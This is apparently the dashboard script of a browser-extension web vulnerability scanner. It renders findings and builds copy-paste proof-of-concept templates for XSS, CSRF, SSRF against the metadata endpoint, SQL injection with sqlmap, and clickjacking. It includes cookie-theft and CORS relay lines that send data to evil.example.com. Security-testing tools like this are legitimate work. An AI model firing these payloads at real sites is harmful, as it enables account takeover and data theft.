// dashboard.js — findings display, export, filtering
const $ = id => document.getElementById(id);
// Report runtime errors to the background collector (surfaced in Diagnostics)
try {
  window.addEventListener("error", e => { try { chrome.runtime.sendMessage({ type: "REPORT_ERROR", source: "dashboard", error: { message: e.message, stack: e.error && e.error.stack, url: location.href } }); } catch {} });
  window.addEventListener("unhandledrejection", e => { try { chrome.runtime.sendMessage({ type: "REPORT_ERROR", source: "dashboard", error: { message: "Unhandled rejection: " + (e.reason && (e.reason.message || e.reason)), stack: e.reason && e.reason.stack, url: location.href } }); } catch {} });
} catch {}

// Toolbar dropdowns (Phase 2). Menu items keep their ids — existing handlers still fire.
(function initDropdowns() {
  const dropdowns = [...document.querySelectorAll(".dropdown")];
  dropdowns.forEach(dd => {
    const toggle = dd.querySelector(".dd-toggle");
    const menu = dd.querySelector(".dd-menu");
    // Hide any dropdown whose menu has no buttons (Pro items stripped in the free build).
    if (!toggle || !menu || menu.querySelectorAll(".btn").length === 0) { dd.style.display = "none"; return; }
    toggle.addEventListener("click", (e) => {
      e.stopPropagation();
      const wasOpen = dd.classList.contains("open");
      dropdowns.forEach(x => x.classList.remove("open"));
      if (!wasOpen) dd.classList.add("open");
    });
    menu.addEventListener("click", () => dd.classList.remove("open")); // close after item click
  });
  document.addEventListener("click", () => dropdowns.forEach(x => x.classList.remove("open")));
})();

let allFindings = {}, allRequests = {}, allConfirmed = [], allPm = {},
    allPmAnalysis = {}, allPmTraffic = {}, allWs = {}, allWorkers = {};
let activeSeverity = "all";
let showLowConf = false; // tier-1 "potential" findings hidden by default (three-tier system)
// Hide user-dismissed (false positive) findings, and tier-1 "potential" ones unless toggled on.
const passesConf = e => (e.verificationStatus !== "false_positive") && (showLowConf || (e.tier || 1) >= 2);

let DEBUG = false;
function dbg(...a) { if (DEBUG) console.log("%c[Dashboard]", "color:#58a6ff;font-weight:bold", ...a); }
function send(msg) { return new Promise(r => chrome.runtime.sendMessage(msg, r)); }


function toast(message, type = "info", duration = 3000) {
  const el = document.createElement("div");
  el.className = `yansii-toast yansii-toast-${type}`;
  el.textContent = message;
  document.body.appendChild(el);
  requestAnimationFrame(() => el.classList.add("show"));
  setTimeout(() => { el.classList.remove("show"); setTimeout(() => el.remove(), 300); }, duration);
}

function confirmModal(message) {
  return new Promise(resolve => {
    const overlay = document.createElement("div");
    overlay.className = "modal-overlay open";
    overlay.innerHTML = `<div class="modal" style="width:400px;text-align:center">
      <h2 style="margin-bottom:12px">Confirm</h2>
      <p style="color:var(--fg2);margin-bottom:20px">${message.replace(/</g,"&lt;")}</p>
      <div class="btn-row" style="justify-content:center;display:flex;gap:8px">
        <button class="btn" id="__cm_cancel">Cancel</button>
        <button class="btn primary" id="__cm_ok">Continue</button>
      </div></div>`;
    document.body.appendChild(overlay);
    overlay.querySelector("#__cm_cancel").onclick = () => { overlay.remove(); resolve(false); };
    overlay.querySelector("#__cm_ok").onclick = () => { overlay.remove(); resolve(true); };
    overlay.addEventListener("keydown", e => { if (e.key === "Escape") { overlay.remove(); resolve(false); } });
    overlay.querySelector("#__cm_cancel").focus();
  });
}

// P8: a tier-1 indicator's suggestion is often a long offensive cheat sheet. Show only the
// first 2-3 verification steps by default and tuck the full payload list behind a collapsed
// "Show advanced payloads" expander, so a card reads like "indicator + how to verify", not a
// weaponization guide.
function renderSuggestion(text) {
  if (!text) return '';
  const s = String(text);
  const lines = s.split("\n");
  if (s.length <= 240 || lines.filter(l => l.trim()).length <= 3) {
    return `<div class="field"><div class="field-label">How to verify</div><pre>${esc(s)}</pre></div>`;
  }
  const concise = [];
  let i = 0;
  for (; i < lines.length && concise.length < 3; i++) { if (lines[i].trim()) concise.push(lines[i]); }
  const advanced = lines.slice(i).join("\n").trim();
  return `<div class="field"><div class="field-label">How to verify</div><pre>${esc(concise.join("\n"))}</pre>` +
    (advanced ? `<details style="margin-top:6px"><summary style="cursor:pointer;color:var(--blue,#58a6ff);font-size:12px">Show advanced payloads</summary><pre style="margin-top:6px">${esc(advanced)}</pre></details>` : '') +
    `</div>`;
}

// ── Load data ──
async function load() {
  dbg("Loading global data…");
  const [gf, gl] = await Promise.all([
    send({ type: "getGlobalFindings" }),
    send({ type: "getGlobalLog" })
  ]);
  dbg("getGlobalFindings:", gf);
  dbg("getGlobalLog:", gl);

  if (gf?.G) {
    allFindings = gf.G.findings || {};
    allRequests = gf.G.requests || {};
    allConfirmed = gf.G.confirmedBugs || [];
    allWs = gf.G.wsTraffic || {};
    allWorkers = gf.G.workerEvents || {};
  } else {
    allFindings = gf?.globalFindings || gf?.findings || {};
    allRequests = gf?.globalRequests || gf?.requests || {};
    allConfirmed = gf?.confirmedBugs || [];
  }
  allPm = gl?.globalLog || {};
  allPmAnalysis = gl?.globalAnalysis || {};
  allPmTraffic = gl?.globalTraffic || {};

  dbg("Domains:", Object.keys(allFindings));
  render();
}

// ── Render ──
let openDomains = new Set();

function render() {
  const search = ($("searchBox").value || "").toLowerCase();
  let totalFindings = 0, totalCrit = 0, totalHigh = 0, totalPm = 0;
  const domains = new Set([...Object.keys(allFindings), ...Object.keys(allPm)]);
  const sevOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };

  // Count stats matching the active filter
  for (const d of domains) {
    const fl = allFindings[d] || [];
    const matched = fl.filter(e => {
      if (activeSeverity !== "all" && e.finding?.severity !== activeSeverity) return false;
      if (!passesConf(e)) return false;
      if (!search) return true;
      return (e.finding?.type || "").toLowerCase().includes(search) ||
             (e.finding?.detail || "").toLowerCase().includes(search);
    });
    totalFindings += matched.length;
    // Critical/High header stats reflect CONFIRMED (tier-3) findings only
    totalCrit += matched.filter(e => (e.tier || 1) === 3 && e.finding?.severity === "critical").length;
    totalHigh += matched.filter(e => (e.tier || 1) === 3 && e.finding?.severity === "high").length;
    totalPm += (allPm[d] || []).length;
  }

  // Tier totals (confirmed / review / potential) across all domains
  let potentialTotal = 0, reviewTotal = 0, confirmedTotal = 0;
  for (const d of domains) for (const e of (allFindings[d] || [])) {
    if (e.verificationStatus === "false_positive") continue;
    const t = e.tier || 1;
    if (t === 3) confirmedTotal++; else if (t === 2) reviewTotal++; else potentialTotal++;
  }
  if ($("potentialCount")) $("potentialCount").textContent = potentialTotal ? "(" + potentialTotal + ")" : "";

  $("sDomains").textContent = domains.size;
  $("sFindings").textContent = totalFindings;
  $("sCritical").textContent = totalCrit;
  $("sHigh").textContent = totalHigh;
  $("sConfirmed").textContent = allConfirmed.length;
  $("sPm").textContent = totalPm;

  // Confirmed
  if (allConfirmed.length > 0) {
    $("confirmedSection").classList.remove("hidden");
    $("confirmedCount").textContent = allConfirmed.length;
    $("confirmedList").innerHTML = allConfirmed.map((b, i) =>
      `<div class="confirmed-card">
        <div class="info">
          <div class="title">✅ ${esc(b.type)} — ${esc(b.domain)}</div>
          <div class="meta">${esc(b.url)} · ${new Date(b.timestamp).toLocaleString()}</div>
        </div>
        <button class="btn green" data-action="download-doc" data-index="${i}">📄 Download</button>
      </div>`
    ).join("");
  } else {
    $("confirmedSection").classList.add("hidden");
  }

  // Filter & sort domains — hide domains with no matching findings
  const sortedDomains = [...domains].filter(d => {
    const fl = allFindings[d] || [];
    const hasMatch = fl.some(e => {
      if (activeSeverity !== "all" && e.finding?.severity !== activeSeverity) return false;
      if (!passesConf(e)) return false;
      if (!search) return true;
      return (e.finding?.type || "").toLowerCase().includes(search) ||
             (e.finding?.detail || "").toLowerCase().includes(search);
    });
    const hasPm = (allPm[d] || []).length > 0;
    if (!hasMatch && !hasPm && activeSeverity !== "all") return false;
    if (search && !hasMatch && !d.includes(search)) return false;
    return true;
  }).sort((a, b) => {
    const ac = (allFindings[a] || []).filter(e => e.finding?.severity === "critical" || e.finding?.severity === "high").length;
    const bc = (allFindings[b] || []).filter(e => e.finding?.severity === "critical" || e.finding?.severity === "high").length;
    return bc - ac;
  });

  $("domainCount").textContent = sortedDomains.length;

  if (sortedDomains.length === 0) {
    $("domainList").innerHTML = '<div class="empty"><div class="icon">⌖</div><p>No findings match the current filter.<br>Try "All" or a different severity.</p></div>';
    return;
  }

  $("domainList").innerHTML = sortedDomains.map(domain => {
    const findings = allFindings[domain] || [];
    const pm = allPm[domain] || [];
    const reqs = allRequests[domain] || [];
    const ws = allWs[domain] || [];
    const crit = findings.filter(e => (e.tier || 1) === 3 && e.finding?.severity === "critical").length;
    const high = findings.filter(e => (e.tier || 1) === 3 && e.finding?.severity === "high").length;
    const isOpen = openDomains.has(domain);

    // Apply severity filter + search filter, then sort
    let filtered = findings.filter(e => {
      if (activeSeverity !== "all" && e.finding?.severity !== activeSeverity) return false;
      if (!passesConf(e)) return false;
      if (!search) return true;
      return (e.finding?.type || "").toLowerCase().includes(search) ||
             (e.finding?.detail || "").toLowerCase().includes(search);
    }).sort((a, b) => {
      // Highest tier first (confirmed → review → potential), then by severity within a tier
      const at = a.tier || 1, bt = b.tier || 1;
      if (at !== bt) return bt - at;
      return (sevOrder[a.finding?.severity] || 5) - (sevOrder[b.finding?.severity] || 5);
    });

    const findingRows = filtered.map(e => {
      // Shared tier→display mapping (tier-display.js) — the SAME function the DevTools
      // panel uses, so the two surfaces can never drift on the "no false criticals" rule.
      const td = window.yansiiTierDisplay(e);
      const displaySev = td.sevClass, tierWord = td.label, sevText = td.sevText, isCritHigh = td.isCritHigh;
      const aiBadge = e.aiAnalyzed ? '<span style="font-size:8px;padding:1px 4px;border-radius:3px;background:#1a1a3d;color:#bc8cff;margin-left:2px" title="AI analyzed">🧠</span>' : '';
      return `<div class="finding-row${isCritHigh ? ' crit-row' : ''}" data-action="show-detail" data-domain="${esc(domain)}" data-hash="${esc(e.hash)}">
        <span class="sev ${displaySev}">${sevText}</span>
        <span class="vstatus ${tierWord}">${tierWord}${aiBadge}</span>
        <span class="type">${esc(e.finding?.type || '?')}</span>
        <span class="url" title="${esc(e.url)}">${esc(e.url)}</span>
        <span class="score">${td.cvssText}</span>
        <span class="time">${timeAgo(e.timestamp)}</span>
        <span class="row-actions">
          <button class="row-btn verify" data-action="verify" data-domain="${esc(domain)}" data-hash="${esc(e.hash)}" title="Active Verify">⚡</button>
          <button class="row-btn" data-action="ai" data-domain="${esc(domain)}" data-hash="${esc(e.hash)}" title="AI Analysis">◈</button>
          <button class="row-btn" data-action="doc" data-domain="${esc(domain)}" data-hash="${esc(e.hash)}" title="Document">📄</button>
        </span>
      </div>`;
    }).join("");

    const pmRows = pm.map((p, pi) =>
      `<div class="pm-row" data-action="show-pm" data-domain="${esc(domain)}" data-idx="${pi}" style="cursor:pointer" title="Click for details">
        <span class="pm-tag">PM</span>
        <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(p.record?.frameUrl || '?')}</span>
        <span style="font-size:10px">${p.record?.analysis?.originCompared ? '✅ origin' : '⚠ no origin'}</span>
        <span style="font-size:10px;color:var(--purple)">${(p.record?.analysis?.sinks || []).join(', ') || 'no sinks'}</span>
      </div>`
    ).join("");

    // Stats string — show filtered count vs total
    let statsStr = activeSeverity !== "all" ? `${filtered.length}/${findings.length} findings` : `${findings.length} findings`;
    if (crit) statsStr += ` · <span class="s-crit">${crit} crit</span>`;
    if (high) statsStr += ` · <span class="s-high">${high} high</span>`;
    if (pm.length) statsStr += ` · ${pm.length} PM`;
    if (reqs.length) statsStr += ` · ${reqs.length} reqs`;

    return `<div class="domain-group">
      <div class="domain-header${isOpen ? ' open' : ''}" data-action="toggle-domain" data-domain="${esc(domain)}">
        <span class="arrow">${isOpen ? '▾' : '▸'}</span>
        <span class="domain-name">${esc(domain)}</span>
        <span class="domain-stats">${statsStr}</span>
      </div>
      <div class="domain-body${isOpen ? ' open' : ''}">${findingRows}${pmRows}</div>
    </div>`;
  }).join("");
}

// ── Event delegation for the entire page ──
document.addEventListener("click", e => {
  const target = e.target.closest("[data-action]");
  if (!target) return;
  const action = target.dataset.action;

  if (action === "toggle-domain") {
    e.stopPropagation();
    const header = target;
    const body = header.nextElementSibling;
    const isOpen = body.classList.contains("open");
    const domain = header.dataset.domain;
    body.classList.toggle("open");
    header.classList.toggle("open");
    header.querySelector(".arrow").textContent = isOpen ? "▸" : "▾";
    if (isOpen) openDomains.delete(domain);
    else openDomains.add(domain);
    return;
  }

  if (action === "show-detail") {
    e.stopPropagation();
    const domain = target.dataset.domain;
    const hash = target.dataset.hash;
    showDetail(domain, hash);
    return;
  }

  if (action === "show-pm") {
    e.stopPropagation();
    showPmDetail(target.dataset.domain, parseInt(target.dataset.idx, 10));
    return;
  }

  if (action === "verify") {
    e.stopPropagation();
    verifyFinding(target.dataset.domain, target.dataset.hash, target);
    return;
  }

  if (action === "mark-fp") {
    e.stopPropagation();
    markFalsePositive(target.dataset.domain, target.dataset.hash);
    return;
  }

  if (action === "ai") {
    e.stopPropagation();
    if (typeof aiAnalyze === "function") aiAnalyze(target.dataset.domain, target.dataset.hash);
    else toast("AI Analysis is a Pro feature. Upgrade at yansii.in/pricing", "warning");
    return;
  }

  if (action === "doc") {
    e.stopPropagation();
    docFinding(target.dataset.domain, target.dataset.hash);
    return;
  }

  if (action === "download-doc") {
    e.stopPropagation();
    downloadDoc(parseInt(target.dataset.index));
    return;
  }

  if (action === "close-modal") {
    $("detailModal").classList.remove("open");
    return;
  }
});

// ── Show finding detail ──
// Build a copy-paste proof-of-concept for a finding — no AI/API key required.
function buildPoc(f, url) {
  const cat = (f.category || "").toLowerCase();
  const type = (f.type || "").toLowerCase();
  let u; try { u = new URL(url); } catch { u = null; }
  const origin = u ? u.origin : url;
  const param = (f.detail || "").match(/"([^"]+)"|Parameter ([A-Za-z0-9_\-]+)/);
  const pname = param ? (param[1] || param[2]) : "PARAM";

  if (cat.includes("dom-xss") || type.includes("dom xss")) {
    return `# DOM XSS PoC\n# The vulnerable sink reads a URL-controlled source. Open this URL:\n${origin}${u ? u.pathname : ""}#<img src=x onerror=alert(document.domain)>\n\n# or via query/hash depending on the source seen in the finding:\n${origin}${u ? u.pathname : ""}?${pname}=<img src=x onerror=alert(1)>\n\n# Confirm the alert fires (script executes in the page origin).`;
  }
  if (cat.includes("xss") || type.includes("reflected")) {
    const target = u ? `${origin}${u.pathname}?${pname}=<img src=x onerror=alert(document.domain)>` : `${origin}?${pname}=<img src=x onerror=alert(document.domain)>`;
    return `# Reflected XSS PoC\n# 1) Load the URL and confirm the payload renders unencoded:\n${target}\n\n# 2) If it executes, host this to demonstrate impact:\n<html><body>\n  <script>location='${target}';</script>\n</body></html>`;
  }
  if (cat.includes("csrf")) {
    return `# CSRF PoC (auto-submitting form) — replace ACTION/fields with the real request\n<html><body onload="document.forms[0].submit()">\n  <form action="${origin}/ACTION" method="POST">\n    <input type="hidden" name="field" value="attacker_value">\n  </form>\n</body></html>\n# Host this, open it while authenticated to the target, confirm the state change.`;
  }
  if (cat.includes("open-redirect")) {
    return `# Open Redirect PoC\n${origin}${u ? u.pathname : ""}?${pname}=https://evil.example.com\n# Confirm the app 302-redirects to the attacker domain. Chain with OAuth if a redirect_uri is involved.`;
  }
  if (cat.includes("ssrf")) {
    return `# SSRF PoC (curl) — swap in the vulnerable endpoint/param\ncurl -sS '${origin}${u ? u.pathname : ""}?${pname}=http://169.254.169.254/latest/meta-data/' \\\n  -H 'Cookie: <your session>'\n# Watch for internal responses. Also try http://127.0.0.1, file://, gopher://.`;
  }
  if (cat.includes("cors")) {
    return `# CORS misconfig PoC — run from a different origin (e.g. https://evil.example.com console)\nfetch('${origin}${u ? u.pathname : "/api/me"}', {credentials:'include'})\n  .then(r=>r.text()).then(d=>fetch('https://evil.example.com/log?d='+encodeURIComponent(d)));\n# If the response is readable cross-origin with credentials, it's exploitable.`;
  }
  if (cat.includes("clickjack")) {
    return `# Clickjacking PoC\n<html><body>\n  <iframe src="${origin}${u ? u.pathname : ""}" width="1000" height="700" style="opacity:0.1"></iframe>\n</body></html>\n# If the page renders inside the iframe, framing protections are missing.`;
  }
  if (cat.includes("sqli")) {
    return `# SQL Injection PoC (manual + sqlmap)\n# Manual: append to the "${pname}" parameter and look for errors/boolean diffs:\n${origin}${u ? u.pathname : ""}?${pname}=1' OR '1'='1\n\n# sqlmap:\nsqlmap -u "${origin}${u ? u.pathname : ""}?${pname}=1" -p ${pname} --batch --risk=2 --level=3`;
  }
  if (cat.includes("cookie")) {
    return `# Cookie flag PoC\n# Open DevTools > Application > Cookies for ${origin}\n# Confirm the flagged cookie is missing HttpOnly/Secure. If HttpOnly is missing AND\n# the app has XSS, demonstrate theft: <script>fetch('https://evil.example.com/?c='+document.cookie)</script>`;
  }
  // Generic
  return `# PoC template for: ${f.type}\n# URL: ${url}\n# ${(f.detail || "").slice(0, 200)}\n\n# Reproduce with curl:\ncurl -sSi '${url}' -H 'Cookie: <your session>'\n# Then follow the finding's suggestion to confirm impact.`;
}

function showPoc(domain, hash) {
  const e = (allFindings[domain] || []).find(x => x.hash === hash);
  if (!e) return;
  const f = e.finding || {};
  const poc = buildPoc(f, e.url);
  const verifiedNote = e.verificationStatus === "verified"
    ? `<div style="color:var(--green);font-size:11px;margin-bottom:6px">✓ This finding is verified — the PoC below should reproduce reliably.</div>`
    : `<div style="color:var(--yellow);font-size:11px;margin-bottom:6px">⚠ Unverified (passive detection). Use this PoC to confirm the finding manually.</div>`;
  $("detailBox").innerHTML =
    `<h2>🧪 Proof of Concept — ${esc(f.type || "?")}</h2>
     ${verifiedNote}
     <pre id="pocText" style="max-height:340px;overflow:auto;white-space:pre-wrap">${esc(poc)}</pre>
     <div class="btn-row">
       <button class="btn primary" data-action="close-modal">Close</button>
       <button class="btn green" id="pocCopyBtn">📋 Copy PoC</button>
     </div>`;
  $("detailModal").classList.add("open");
  $("pocCopyBtn").addEventListener("click", () => {
    navigator.clipboard.writeText(poc).then(() => toast("PoC copied", "success"), () => toast("Clipboard blocked — select and copy", "warning"));
  });
}

function showPmDetail(domain, idx) {
  const p = (allPm[domain] || [])[idx];
  if (!p) return;
  const r = p.record || {};
  const a = r.analysis || {};
  const html = `<h2>postMessage Handler — ${esc(domain)}</h2>
    <div class="field"><div class="field-label">Frame URL</div><div class="field-value" style="font-family:var(--mono);font-size:11px">${esc(r.frameUrl || '?')}</div></div>
    <div class="field"><div class="field-label">Origin Validation</div><div class="field-value">${a.originCompared ? '✅ Compares event.origin' : '⚠️ No origin check detected — potential cross-origin message injection'}</div></div>
    ${(a.sinks && a.sinks.length) ? `<div class="field"><div class="field-label">Dangerous Sinks</div><div class="field-value"><span style="color:var(--purple)">${esc(a.sinks.join(', '))}</span></div></div>` : ''}
    ${r.source ? `<div class="field"><div class="field-label">Handler Source</div><pre style="max-height:300px;overflow:auto">${esc((r.source || '').slice(0, 4000))}</pre></div>` : ''}
    <div class="btn-row"><button class="btn primary" data-action="close-modal">Close</button></div>`;
  $("detailBox").innerHTML = html;
  $("detailModal").classList.add("open");
}

function showDetail(domain, hash) {
  const entries = allFindings[domain] || [];
  const e = entries.find(x => x.hash === hash);
  if (!e) return;
  const f = e.finding || {};
  // P4: severity/CVSS is the loudest signal — render it via the shared tier-display so a
  // tier-1 "potential" indicator never shows a red severity badge or a scary CVSS number.
  const td = window.yansiiTierDisplay(e);

  $("detailBox").innerHTML =
    `<h2>${esc(f.type || '?')}</h2>
    <div class="field">
      <div class="field-label">${td.showCvss ? 'Severity / CVSS' : 'Status'}</div>
      <div class="field-value">
        <span class="sev ${td.sevClass}">${td.sevText}</span>
        ${td.showCvss && e.cvss ? ` · ${e.cvss.score} (${e.cvss.rating})` : ''}
        ${td.showCvss && e.cvss?.vector ? ` · <code style="font-size:10px;color:var(--fg3)">${esc(e.cvss.vector)}</code>` : ''}
        ${!td.showCvss ? ` · <span style="color:var(--mut)">unverified indicator — no CVSS until confirmed</span>` : ''}
        ${f.subtype ? ` · <span style="color:var(--purple)">${esc(f.subtype)}</span>` : ''}
      </div>
    </div>
    <div class="field">
      <div class="field-label">URL</div>
      <div class="field-value" style="font-family:var(--mono);font-size:11px">${esc(e.url)}</div>
    </div>
    <div class="field">
      <div class="field-label">Detail</div>
      <div class="field-value">${esc(f.detail)}</div>
    </div>
    <div class="field">
      <div class="field-label">Category / Source</div>
      <div class="field-value">${esc(f.category || '?')} · ${esc(e.source || '?')} · ${new Date(e.timestamp).toLocaleString()}</div>
    </div>
    ${renderSuggestion(f.suggestion)}
    <div class="field">
      <div class="field-label">Status</div>
      <div class="field-value">
        ${(() => { const t = e.tier || 1; const label = t === 3 ? '✅ OBSERVED (directly observable fact — e.g. a missing security header; real at this severity, but NOT a confirmed exploit)' : t === 2 ? '🔍 NEEDS REVIEW (active test suggests it may be real)' : '💤 POTENTIAL (passive detection — may be a false positive)'; const col = t === 3 ? 'var(--green,#3fb950)' : t === 2 ? 'var(--yellow,#d29922)' : 'var(--mut,#8b949e)'; return `<span style="color:${col};font-weight:700">${label}</span>`; })()}
        · confidence ${typeof e.confidence === 'number' ? e.confidence + '%' : (e.confidence || 'n/a')}
        ${e.verifyResult ? ` — ${esc(e.verifyResult.reason || '')}` : ''}
        ${e.verifiedAt ? ` · ${new Date(e.verifiedAt).toLocaleString()}` : ''}
      </div>
    </div>
    ${(e.tier === 3 && e.evidence) ? `<div class="field"><div class="field-label">🔬 Evidence (why this is confirmed)</div><div class="field-value">
      ${e.evidence.proof ? `<div><strong>Proof:</strong> ${esc(e.evidence.proof)}</div>` : ''}
      ${e.evidence.technique ? `<div><strong>Technique:</strong> ${esc(e.evidence.technique)}</div>` : ''}
      ${e.evidence.request ? `<div><strong>Request:</strong> <pre>${esc(String(e.evidence.request).slice(0, 400))}</pre></div>` : ''}
      ${e.evidence.response ? `<div><strong>Response:</strong> <pre>${esc(String(e.evidence.response).slice(0, 400))}</pre></div>` : ''}
    </div></div>` : ''}
    ${(e.tier || 1) < 3 ? `<div class="field"><div class="field-label">How to confirm</div><div class="field-value" style="color:var(--mut,#8b949e)">This is not yet confirmed. Use the ⚡ Verify button (Pro) to actively test it, or the 🧪 Generate PoC button for manual steps.</div></div>` : ''}
    ${e.confirmationGate ? `<div class="field"><div class="field-label">✅ Proof gate (what makes this reportable)</div><div class="field-value" style="color:var(--fg2,#adbac7)">${esc(e.confirmationGate)}</div></div>` : ''}
    ${e.impactNote ? `<div class="field"><div class="field-label">📊 Impact scale</div><div class="field-value" style="color:var(--fg2,#adbac7)">${esc(e.impactNote)}</div></div>` : ''}
    ${e.siblingHint ? `<div class="field"><div class="field-label">🔗 Next: sibling endpoints</div><div class="field-value" style="color:var(--fg2,#adbac7)">${esc(e.siblingHint)}</div></div>` : ''}
    ${e.verifyResult?.payload ? `<div class="field"><div class="field-label">Verification Payload</div><pre>${esc(e.verifyResult.payload)}</pre></div>` : ''}
    ${e.verifyResult?.evidence ? `<div class="field"><div class="field-label">Evidence</div><pre>${esc(e.verifyResult.evidence)}</pre></div>` : ''}
    ${e.aiVerifyResult ? `<div class="field"><div class="field-label">🧠 AI-Assisted Assessment</div>
      <div class="field-value">
        <span style="color:var(--purple);font-weight:700">${esc(e.aiVerifyResult.ai_assessment || '?')}</span>
        · Confidence: ${esc(e.aiVerifyResult.confidence || 0)}%
        <br><span style="color:var(--fg2);font-size:11px">${esc(e.aiVerifyResult.reasoning || '')}</span>
        ${e.aiVerifyResult.suggested_payloads?.length ? '<br><strong>Suggested:</strong> ' + e.aiVerifyResult.suggested_payloads.map(p => '<code>' + esc(p) + '</code>').join(', ') : ''}
      </div></div>` : ''}
    ${e.aiVerifyAssist ? `<div class="field"><div class="field-label">🧠 AI Verification Assist</div>
      <div class="field-value">
        <span style="color:var(--yellow);font-weight:700">${esc(e.aiVerifyAssist.verdict || '?')}</span>
        <br><span style="color:var(--fg2);font-size:11px">${esc(e.aiVerifyAssist.reasoning || '')}</span>
        ${e.aiVerifyAssist.alternative_payload ? '<br><strong>Alt Payload:</strong> <code>' + esc(e.aiVerifyAssist.alternative_payload) + '</code>' : ''}
      </div></div>` : ''}
    <div class="btn-row">
      <button class="btn primary" data-action="close-modal">Close</button>
      <button class="btn green" id="modalVerifyBtn" data-domain="${esc(domain)}" data-hash="${esc(hash)}">⚡ Verify</button>
      <button class="btn" id="modalFpBtn" data-action="mark-fp" data-domain="${esc(domain)}" data-hash="${esc(hash)}" style="border-color:var(--blue);color:var(--blue)">✕ False Positive</button>
      <button class="btn purple" id="modalAiBtn">◈ AI Deep Dive</button>
      <button class="btn purple" id="modalAiVerifyBtn" style="border-color:var(--yellow);color:var(--yellow)">🤖 AI Verify</button>
      <button class="btn green" id="modalDocBtn">📄 Investigation</button>
      <button class="btn" id="modalPocBtn" style="border-color:var(--red);color:var(--red)" title="Generate a copy-paste proof-of-concept for this finding (no AI needed)">🧪 Generate PoC</button>
      <button class="btn" id="modalCopyCCBtn" style="border-color:var(--blue);color:var(--blue)" title="Copy this finding in a structured format for pasting into an AI agent">📋 Copy for AI agent</button>
    </div>
    <div id="modalVerifyResult"></div>
    <div id="modalAiResult">${e.aiDeepDive ? `<div class="ai-result"><div class="ai-label">◈ AI Analysis (cached)</div><pre>${esc(e.aiDeepDive)}</pre></div>` : ''}</div>`;

  $("detailModal").classList.add("open");

  // Wire up modal buttons directly (these are inside the modal, not part of delegation pattern for simplicity)
  $("modalVerifyBtn").addEventListener("click", () => verifyFinding(domain, hash, $("modalVerifyBtn")));
  $("modalAiBtn").addEventListener("click", () => {
    if (typeof aiAnalyze === "function") aiAnalyze(domain, hash);
    else toast("AI Deep Dive is a Pro feature. Upgrade at yansii.in/pricing", "warning");
  });
  $("modalAiVerifyBtn").addEventListener("click", () => {
    if (typeof aiVerify === "function") aiVerify(domain, hash);
    else toast("AI Verify is a Pro feature. Upgrade at yansii.in/pricing", "warning");
  });
  $("modalDocBtn").addEventListener("click", () => docFinding(domain, hash));
  $("modalPocBtn").addEventListener("click", () => showPoc(domain, hash));
  $("modalCopyCCBtn").addEventListener("click", () => {
    const md = [
      `# Security Finding: ${f.type || "?"}`,
      ``,
      `- **Domain:** ${domain}`,
      `- **URL:** ${e.url || "?"}`,
      `- **Severity (raw):** ${f.severity || "info"}`,
      `- **Verification status:** ${e.verificationStatus || "detected"}`,
      `- **Confidence:** ${e.confidence || "medium"}`,
      `- **Category:** ${f.category || "?"}${f.subtype ? " / " + f.subtype : ""}`,
      e.cvss?.score ? `- **CVSS:** ${e.cvss.score} (${e.cvss.rating}) ${e.cvss.vector || ""}` : "",
      ``,
      `## Detail`,
      f.detail || "(none)",
      f.evidence ? `\n## Evidence\n${f.evidence}` : "",
      f.suggestion ? `\n## Suggested tests / payloads\n${f.suggestion}` : "",
      ``,
      `## Task`,
      `Verify whether this is a real, exploitable vulnerability. It was found by a passive scanner and is unconfirmed. Reproduce it, confirm impact, and if real, write it up; if not, explain why it is a false positive.`,
    ].filter(x => x !== "").join("\n");
    navigator.clipboard.writeText(md).then(
      () => toast("Finding copied for an AI agent", "success"),
      () => toast("Clipboard blocked — select and copy manually", "warning")
    );
  });
}

// ── Modal close on backdrop click + Escape ──
$("detailModal").addEventListener("click", e => {
  if (e.target === $("detailModal")) $("detailModal").classList.remove("open");
});
document.addEventListener("keydown", e => {
  if (e.key === "Escape") $("detailModal").classList.remove("open");
});


// ── Document finding (Investigation Package) ──
async function docFinding(domain, hash) {
  dbg("Generating investigation package for", domain, hash);
  const resp = await send({ type: "GENERATE_INVESTIGATION", url: domain, domain, hash });
  if (resp?.ok) {
    const date = new Date().toISOString().slice(0, 10);
    dl(resp.markdown, "text/markdown", `investigation_${domain}_${hash.slice(0, 8)}_${date}.md`);
  } else {
    const resp2 = await send({ type: "generateFindingDoc", url: domain, hash });
    if (resp2?.ok) {
      dl(resp2.markdown, "text/markdown", `finding_${domain}_${new Date().toISOString().slice(0, 10)}.md`);
    }
  }
}

function downloadDoc(i) {
  const bug = allConfirmed[i]; if (!bug) return;
  dl(bug.doc, "text/markdown", `confirmed_${bug.domain}_${new Date(bug.timestamp).toISOString().slice(0, 10)}.md`);
}

// ── Filter pills (event delegation) ──
$("filterBar").addEventListener("click", e => {
  const pill = e.target.closest(".pill");
  if (!pill || pill.id === "lowConfToggle") return; // the low-confidence toggle is handled separately
  document.querySelectorAll(".pill[data-sev]").forEach(p => p.classList.remove("active"));
  pill.classList.add("active");
  activeSeverity = pill.dataset.sev;
  render();
});
$("showLowConf")?.addEventListener("change", () => {
  showLowConf = $("showLowConf").checked;
  render();
});

// ── Export buttons ──
$("btnExportAll").addEventListener("click", async () => {
  if (!await confirmModal("Export may contain sensitive data (cookies, headers, API traffic). Treat the exported file as confidential. Continue?")) return;
  const data = { allFindings, allRequests, allConfirmed, allPm, allPmAnalysis, allPmTraffic, allWs, allWorkers, exportedAt: new Date().toISOString() };
  dl(JSON.stringify(data, null, 2), "application/json", "yansii-full-export-" + new Date().toISOString().slice(0, 10) + ".json");
});


// ── Clear All — properly purges storage + JS state ──
$("btnClear").addEventListener("click", async () => {
  if (!await confirmModal("Clear ALL findings data? This cannot be undone.")) return;
  // Tell background to wipe G and storage
  await send({ type: "clearAllData" });
  // Also explicitly clear chrome.storage.local from this context
  await chrome.storage.local.remove("G");
  // Reset all local JS state
  allFindings = {};
  allRequests = {};
  allConfirmed = [];
  allPm = {};
  allPmAnalysis = {};
  allPmTraffic = {};
  allWs = {};
  allWorkers = {};
  activeSeverity = "all";
  document.querySelectorAll(".pill").forEach(p => p.classList.remove("active"));
  document.querySelector('.pill[data-sev="all"]').classList.add("active");
  render();
  dbg("All data cleared");
});

// ── Search ──
$("searchBox").addEventListener("input", render);


// ── Custom Rules ──
$("btnRules").addEventListener("click", async () => {
  const resp = await send({ type: "getCustomRules" });
  const rules = resp?.rules || [];
  $("detailBox").innerHTML =
    `<h2>📝 Custom Scan Rules</h2>
